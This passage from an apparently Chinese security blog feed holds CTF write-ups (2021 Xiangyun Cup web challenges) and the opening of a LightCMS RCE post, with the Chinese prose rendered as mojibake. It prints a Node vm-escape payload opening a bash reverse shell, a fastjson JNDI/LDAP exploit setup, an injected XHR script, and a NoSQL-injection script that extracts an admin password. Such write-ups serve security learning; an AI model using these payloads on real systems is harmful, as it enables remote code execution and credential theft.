        <span class="built_in">print</span> <span class="string">&quot;success!&quot;</span></span><br><span class="line">            <span class="built_in">print</span> response.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async(runner, <span class="built_in">range</span>(<span class="number">1000000</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h2 id="å±‚å±‚ç©¿é€"><a href="#å±‚å±‚ç©¿é€" class="headerlink" title="å±‚å±‚ç©¿é€"></a>å±‚å±‚ç©¿é€</h2><p>ç¬¬ä¸€å±‚å‚è€ƒ<a href="https://www.hacking8.com/bug-product/Apache-Flink/Apache-Flink-Dashboard-æœªæˆæƒè®¿é—®-è¿œç¨‹ä»£ç å‘½ä»¤æ‰§è¡Œ.html">https://www.hacking8.com/bug-product/Apache-Flink/Apache-Flink-Dashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html</a>ï¼Œç›´æ¥ä¸Šä¼ ä¸ªmsfçš„é©¬å°±æœ‰meterpreteräº†ã€‚</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203636530.png" alt="image-20210822203636530"></p><p>10.10.1.11:8080æœ‰ä¸ªwebæœåŠ¡ï¼Œé¢˜ç›®ç»™äº†æºç ï¼Œåº”è¯¥å°±æ˜¯è¿™ä¸ªæœåŠ¡ã€‚</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203749893.png" alt="image-20210822203749893"></p><p>fastjson 1.2.24 ååºåˆ—åŒ–ï¼Œè¿‡æ»¤äº†<code>JdbcRowSetImpl</code>å’Œ<code>TemplatesImpl</code>ï¼Œä»¥åŠ<code>\x</code>,<code>\u</code>ã€‚å°è¯•ä½¿ç”¨åˆ«çš„ç±»ã€‚</p><p>æœ€ç»ˆå‚è€ƒ<a href="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>ï¼Œä½¿ç”¨<code>org.apache.shiro.realm.jndi.JndiRealmFactory</code>ã€‚</p><p>payloadé•¿åº¦éœ€è¦å¤§äºç­‰äº20000ï¼ŒåŠ ä¸€äº›æ²¡ç”¨çš„å­—ç¬¦å°±è¡Œäº†ã€‚ä½¿ç”¨npsæ­å»ºä»£ç†ï¼Œè¯·æ±‚ï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204113435.png" alt="image-20210822204113435"></p><p> å¯åŠ¨ldapï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;vps:5555&#x2F;#Exploit&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204217086.png" alt="image-20210822204217086"></p><p>åå¼¹åˆ°shellï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822204238245.png" alt="image-20210822204238245"></p><h2 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h2><p>tokenå¯ä»¥ç”Ÿæˆä¹‹åå…ˆä¸ä½¿ç”¨ï¼ˆä¸verfiyï¼‰ï¼Œç”Ÿæˆtokenåå…ˆæ›´æ–°urlä¸ºæˆ‘ä»¬çš„urlï¼Œå†verfiyï¼Œè¿™æ ·å¯ä»¥è®©çˆ¬è™«æ¥è¯·æ±‚æˆ‘ä»¬çš„ç½‘é¡µã€‚</p><p>Vpsä¸Šwebç›®å½•åˆ›å»ºä¸€ä¸ªç›®å½•åä¸ºdf101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.comï¼Œå°±å¯ä»¥è®©æœåŠ¡å™¨æ¥è¯·æ±‚åˆ°æˆ‘ä»¬æŒ‡å®šçš„å†…å®¹ã€‚urlä¸º <a href="http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html">http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html</a>ã€‚</p><p>zombieè§£æjsæ—¶ï¼Œæ³¨æ„åˆ° requireäº†vmï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822201913335.png" alt="image-20210822201913335"></p><p>ç”¨vmé€ƒé€¸çš„payloadå¯ä»¥rceã€‚</p><p>vpsçš„htmlä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> process = <span class="built_in">this</span>.constructor.constructor(<span class="string">&#x27;return this.process&#x27;</span>)();</span></span><br><span class="line"><span class="javascript">process.mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx/1235 0&gt;&amp;1&quot;&#x27;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯·æ±‚çš„expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zedkd2t5zhfm6oq17bu.cloudeci1.ichunqiu.com:8888&quot;</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: <span class="string">&quot;gml&quot;</span>, <span class="string">&quot;username&quot;</span>: <span class="string">&quot;gml&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/signin&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/signin&quot;</span>, data=paramsPost,</span><br><span class="line">                            headers=headers, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;bucket&quot;</span>: <span class="string">&quot;https://4653639b575bee89f70fbb0f1b6b721f.oss-cn-beijing.ichunqiu.com/&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;affiliation&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;age&quot;</span>: <span class="string">&quot;22&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/user/profile&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/profile&quot;</span>, data=paramsPost, headers=headers, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    content = response.content</span><br><span class="line">    index = content.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> content[index:index + <span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req_own_url</span>(<span class="params">own_url, token</span>):</span></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;bucket&quot;</span>: own_url,</span><br><span class="line">                  <span class="string">&quot;affiliation&quot;</span>: <span class="string">&quot;22&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;age&quot;</span>: <span class="string">&quot;22&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://eci-2zefjnsex5f9gb25l314.cloudeci1.ichunqiu.com:8888/user/profile&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/profile&quot;</span>, data=paramsPost, headers=headers, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            proxies=proxies)</span><br><span class="line">    session.get(url + <span class="string">&quot;/user/verify?token=&quot;</span> + token, proxies=proxies)</span><br><span class="line">    session.get(url + <span class="string">&quot;/user/bucket&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">token = get_token()</span><br><span class="line">req_own_url(<span class="string">&quot;http://vps/df101d5f2909f5c05a200e0e2e6b053a.oss-cn-beijing.ichunqiu.com/exp.html&quot;</span>, token)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822202803001.png" alt="image-20210822202803001"></p><h2 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h2><p>æºç é‡Œæ‰¾åˆ°ç”¨æˆ·åå¯†ç ï¼šadmin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645 å¯ä»¥ç™»é™†ã€‚<br>ç›®æ ‡åº”è¯¥æ˜¯é€šè¿‡/api/files è¿™ä¸ªæ¥å£æ’å…¥ä¸€æ¡username=admin filename=flag çš„è®°å½•ï¼Œç„¶åå¯ä»¥ä¸‹è½½åˆ°flagæ–‡ä»¶ã€‚</p><p>çŒœæµ‹å¤§æ¦‚ç‡åˆ©ç”¨html-pdfè¿™ä¸ªåº“æ¸²æŸ“çš„æ—¶å€™æ¥å»æ„é€ è¯·æ±‚ï¼Œè¯·æ±‚ /api/files è¿™ä¸ªæ¥å£ã€‚ä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œè¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæ–œæ è¿™äº›ã€‚æµ‹è¯•å‘ç°æ•°ç»„å¯ä»¥ç»•è¿‡è¿‡æ»¤ã€‚</p><p>æ³¨æ„åˆ°flagå­—æ®µæ˜¯ uniqueçš„ï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥flagï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203027700.png" alt="image-20210822203027700"></p><p>å› ä¸ºåé¢è¯»æ–‡ä»¶ç”¨çš„æ˜¯<code>path.join(__dirname , &quot;../files/&quot;, filename)</code> ï¼Œæ‰€ä»¥å¯ä»¥æ’å…¥ä¸€ä¸ª ./flag ç»•è¿‡ã€‚</p><p>contentä¸ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xhr=<span class="keyword">new</span> XMLHttpRequest();url=<span class="string">&#x27;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=be5a14a8e504a66979f6938338b0662c&#x27;</span>;xhr.open(<span class="string">&quot;GET&quot;</span>,url,<span class="literal">true</span>);xhr.send();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203143765.png" alt="image-20210822203143765"></p><p>è®¿é—®<a href="http://eci-2zedk1cbvvah2lkdjevj.cloudeci1.ichunqiu.com:8888/api/files/be5a14a8e504a66979f6938338b0662c">http://eci-2zedk1cbvvah2lkdjevj.cloudeci1.ichunqiu.com:8888/api/files/be5a14a8e504a66979f6938338b0662c</a> å¯ä»¥ä¸‹è½½åˆ°flagã€‚</p><h2 id="packagemanager"><a href="#packagemanager" class="headerlink" title="packagemanager"></a>packagemanager</h2><p>authé‚£é‡Œå­˜åœ¨æ³¨å…¥ï¼š</p><p><img src="/2021/08/22/2021-xiangyuncup/image-20210822203339407.png" alt="image-20210822203339407"></p><p>ç›´æ¥æ‹¼æ¥ï¼Œè¿™é‡Œå‡ºé¢˜äººæœ¬æ„åº”è¯¥æ˜¯æ„é€ æ°¸çœŸæ¡ä»¶ç™»é™†ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥æ³¨å…¥å‡ºadminçš„å¯†ç ï¼Œåº”è¯¥æ˜¯éé¢„æœŸã€‚</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4054f0d389481b5d2d1695267d22f9f8&quot;||this.username &#x3D;&#x3D; &quot;admin&quot;&amp;&amp;this.password[0]&#x3D;&#x3D;&quot;b&#39;</span><br></pre></td></tr></table></figure><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>(<span class="params">token</span>):</span></span><br><span class="line">    <span class="comment"># token = &#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[0]==&quot;b&#x27;</span></span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;_csrf&quot;</span>: <span class="string">&quot;BGrMGSNa-mNAB8YJ0iXTgG9w-zioJNdJr8i0&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;token&quot;</span>: token&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;s%3A_FtDGMZ8FKBr-aGu5R_rY30TJXsnCYYh.fg%2FRDok91jF43jkG%2BqD3weiOFQgsus3kg%2BUSm5iInzU&quot;</span>&#125;</span><br><span class="line">    response = requests.post(<span class="string">&quot;http://47.104.108.80:8888/auth&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                             proxies=proxies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print response.content</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Redirecting&quot;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ss = <span class="built_in">list</span>(string.printable)</span><br><span class="line">    ss.remove(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    data = <span class="string">&quot;&quot;</span></span><br><span class="line">    tem = <span class="string">&#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[%s]==&quot;%s&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> ss:</span><br><span class="line">            payload = tem % (i, c)</span><br><span class="line">            <span class="keyword">if</span> req(payload):</span><br><span class="line">                data += c</span><br><span class="line">                <span class="built_in">print</span> data</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;fail!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    <span class="built_in">print</span> req(<span class="string">&#x27;4054f0d389481b5d2d1695267d22f9f8&quot;||this.username == &quot;admin&quot;&amp;&amp;this.password[0]==&quot;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test()</span></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å…¥å‡ºå¯†ç æ˜¯<code>b!@#$d5dh47jyfz#098crw*w</code>ï¼Œadminç™»é™†è¿›å»å°±æœ‰flagã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lightcmsåå°RCEæ¼æ´æŒ–æ˜</title>
      <link href="/2021/05/10/lightcms-RCE/"/>
      <url>/2021/05/10/lightcms-RCE/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¸ºäº†ç†Ÿæ‚‰ä¸‹ laravelï¼Œæ‰¾äº†ä¸ªåŸºäº laravel å¼€å‘çš„ cms å®¡è®¡ç»ƒç»ƒæ‰‹ï¼Œç„å‡†äº† lightcmsã€‚</p><p>å…ˆæ˜¯æŒ–åˆ°äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´ï¼Œæäº†issueè¢«ä¿®å¤ååˆç®€å•å®¡è®¡äº†ä¸€æ³¢ï¼ŒæŒ–æ˜åˆ°äº†ä¸€ä¸ªæœ‰æ„æ€çš„RCEï¼Œæ„Ÿè§‰å¾ˆé€‚åˆ CTFï¼Œå°±æ‹¿æ¥å‡ºé¢˜äº†ï¼Œè¢«ç”¨åšäº†ä»Šå¹´çº¢å¸½æ¯çš„åˆèµ›ã€‚å¾ˆé—æ†¾ç”±äºæ”¾å‡ºé¢˜ç›®æ—¶é—´è¾ƒæ™š+å¾ˆå¤šdalaoå»æ‰“æ´¥é—¨æ¯äº†ï¼Œè¿™é“é¢˜åªæœ‰ä¸¤ä¸ªé˜Ÿä¼è§£å‡ºã€‚</p><p>é¢˜ç›®ç¯å¢ƒé“¾æ¥ï¼š<a href="https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight">https://github.com/gml-sec/My-CTF-Challenges/tree/main/2021-Redhat-ezlight</a>ã€‚</p><a id="more"></a><p>å…³äºlightcmsçš„ç®€å•ä»‹ç»ï¼š</p><blockquote><p><code>lightCMS</code>æ˜¯ä¸€ä¸ªè½»é‡çº§çš„<code>CMS</code>ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªé€šç”¨çš„åå°ç®¡ç†æ¡†æ¶ä½¿ç”¨ã€‚<code>lightCMS</code>é›†æˆäº†ç”¨æˆ·ç®¡ç†ã€æƒé™ç®¡ç†ã€æ—¥å¿—ç®¡ç†ã€èœå•ç®¡ç†ç­‰åå°ç®¡ç†æ¡†æ¶çš„é€šç”¨åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿæä¾›æ¨¡å‹ç®¡ç†ã€åˆ†ç±»ç®¡ç†ç­‰<code>CMS</code>ç³»ç»Ÿä¸­å¸¸ç”¨çš„åŠŸèƒ½ã€‚</p></blockquote><p>githubåœ°å€ï¼š<a href="https://github.com/eddy8/LightCMS">https://github.com/eddy8/LightCMS</a></p><h2 id="v1-3-5-ä»»æ„æ–‡ä»¶è¯»å–-amp-RCEæ¼æ´"><a href="#v1-3-5-ä»»æ„æ–‡ä»¶è¯»å–-amp-RCEæ¼æ´" class="headerlink" title="v1.3.5 ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´"></a>v1.3.5 ä»»æ„æ–‡ä»¶è¯»å–&amp;RCEæ¼æ´</h2><p>è¿™ä¸ªæ¼æ´å‡ºåœ¨ <code>app/Http/Controllers/Admin/NEditorController.php</code>ä¸­çš„è¿œç¨‹ä¸‹è½½å›¾ç‰‡çš„åŠŸèƒ½ï¼š</p><p><img src="/2021/05/10/lightcms-RCE/image-20210510001913866.png" alt="image-20210510001913866"></p><p>è¿™é‡Œç®€å•ä½¿ç”¨äº† 